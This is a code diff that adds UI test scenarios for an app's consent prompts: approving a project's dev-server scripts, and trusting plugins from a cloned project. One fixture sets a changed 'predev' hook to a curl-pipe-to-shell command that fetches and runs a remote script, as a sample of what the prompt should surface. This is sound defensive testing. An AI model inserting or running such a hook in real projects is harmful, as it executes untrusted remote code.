@@ -9,10 +9,40 @@
  */
 
 import type { Scenario } from '../types';
-import { workspaceCommands, WORKSPACE_PROJECT } from './workspace';
+import { workspaceCommands, WORKSPACE_PROJECT, DEV_CONSENT_SURFACE } from './workspace';
 import { rejectsWith } from '../reject';
 
 const HOUR = 3_600_000;
+
+/** A plugin the project's registry lists, as `list_plugins` returns it (snake_case, `trust` camelCase). */
+function harnessPlugin(id: string, name: string, state: 'new' | 'changed' | 'trusted') {
+  return {
+    manifest: {
+      id,
+      name,
+      version: '1.2.0',
+      description: `${name} for this project`,
+      slots: ['toolbar'],
+      author: 'acme',
+      repository: '',
+      setup: [],
+      min_app_version: '',
+      icon: '',
+      required_commands: [],
+      api_version: 1,
+    },
+    enabled: true,
+    installed_at: 0,
+    source_url: `https://github.com/acme/${id}`,
+    is_dev: false,
+    local_path: '',
+    trust: {
+      state,
+      sha256: 'c'.repeat(64),
+      bundlePath: `${WORKSPACE_PROJECT}/.shipstudio/plugins/${id}/dist/index.js`,
+    },
+  };
+}
 
 const pr = (n: number, title: string, over: Record<string, unknown> = {}) => ({
   number: n,
@@ -93,6 +123,63 @@ export const featureScenarios: Scenario[] = [
       'Header, sidebar, agent pane, and preview all render. This is the baseline every command capture is diffed against.',
     project: WORKSPACE_PROJECT,
     commands: { ...workspaceCommands },
+  },
+  {
+    id: 'dev-server-consent-new',
+    requires: '.dev-consent',
+    title: 'Preview — asks before running a project’s commands',
+    looksRightWhen:
+      'The preview pane asks "Start the dev server?" in place of the spinner, says the dependencies were installed without their install scripts and that starting runs those first, lists every package.json script by name with its command, names the config files that are also part of the approval, and has one "Start dev server" button. Nothing claims the server is starting.',
+    project: WORKSPACE_PROJECT,
+    commands: {
+      ...workspaceCommands,
+      get_dev_server_consent: {
+        state: 'new',
+        fingerprint: 'f1',
+        surface: DEV_CONSENT_SURFACE,
+        installScriptsPending: true,
+      },
+    },
+  },
+  {
+    id: 'dev-server-consent-changed',
+    requires: '.dev-consent',
+    title: 'Preview — the project’s commands or config changed since approval',
+    looksRightWhen:
+      'The heading reads "This project changed — Start dev server?", the hint says its commands or config changed since you last started it, the changed `predev` hook is in the list, and a line names the config files that are also part of the approval.',
+    project: WORKSPACE_PROJECT,
+    commands: {
+      ...workspaceCommands,
+      get_dev_server_consent: {
+        state: 'changed',
+        fingerprint: 'f2',
+        surface: {
+          ...DEV_CONSENT_SURFACE,
+          scripts: {
+            ...DEV_CONSENT_SURFACE.scripts,
+            predev: 'curl -fsSL https://example.com/setup.sh | sh',
+          },
+        },
+        installScriptsPending: false,
+      },
+    },
+  },
+  {
+    id: 'plugin-trust-prompt',
+    requires: '.plugin-trust-prompt',
+    title: 'Workspace — a cloned project asks to load a plugin',
+    looksRightWhen:
+      'A small card under the Plugins control reads "This project wants to load a plugin that calls itself “Deploy Helper”", says plugins run code in the app, shows the bundle path and, labelled "Says it’s from", the repo the project claims, "1 of 2", and Don’t load / Allow buttons. Nothing is modal; the rest of the workspace is usable.',
+    project: WORKSPACE_PROJECT,
+    commands: {
+      ...workspaceCommands,
+      list_plugins: [
+        harnessPlugin('deploy-helper', 'Deploy Helper', 'new'),
+        harnessPlugin('seo-audit', 'SEO Audit', 'changed'),
+      ],
+      approve_plugin: null,
+      decline_plugin: null,
+    },
   },
   {
     id: 'gitlab-remote-push',
